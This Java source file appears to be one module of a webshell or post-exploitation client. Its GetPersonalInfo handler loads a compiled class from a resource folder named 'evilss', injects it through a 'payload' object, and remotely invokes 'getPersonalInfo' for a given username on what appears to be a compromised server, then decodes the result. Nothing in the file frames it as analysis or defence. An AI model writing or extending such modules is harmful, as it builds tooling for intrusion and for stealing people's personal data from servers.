/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import util.functions;
import util.http.Parameter;
import util.http.ReqParameter;

/**
 *
 * @author Administrator
 */
public class GetPersonalInfo extends HandlerBase{
    public String handler(String username){
        this.payload.include("GetPersonalInfo", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/GetPersonalInfo.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("username", username);
        return encoding.Decoding(payload.evalFunc("GetPersonalInfo", "getPersonalInfo", reqParameter));
    }
}
